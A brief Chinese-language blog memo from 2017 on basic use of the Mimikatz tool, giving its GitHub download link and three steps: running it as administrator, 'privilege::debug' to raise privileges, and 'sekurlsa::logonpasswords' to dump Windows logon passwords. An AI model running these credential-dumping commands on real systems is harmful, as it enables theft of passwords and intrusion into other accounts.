---
title: Mimikatz简单使用（备忘）
date: 2017-4-28 18:09
tags: Mimikatz
---
* 下载地址：
[Mimikatz](https://github.com/gentilkiwi/mimikatz/releases/latest)
* 简单使用：
	* step1:
以管理员身份运行mimikatz.exe
(根据计算机系统选择相应版本)
	* step2:
```
privilege::debug

#提升权限
```
	* step3:
```
sekurlsa::logonpasswords

#获取密码
```
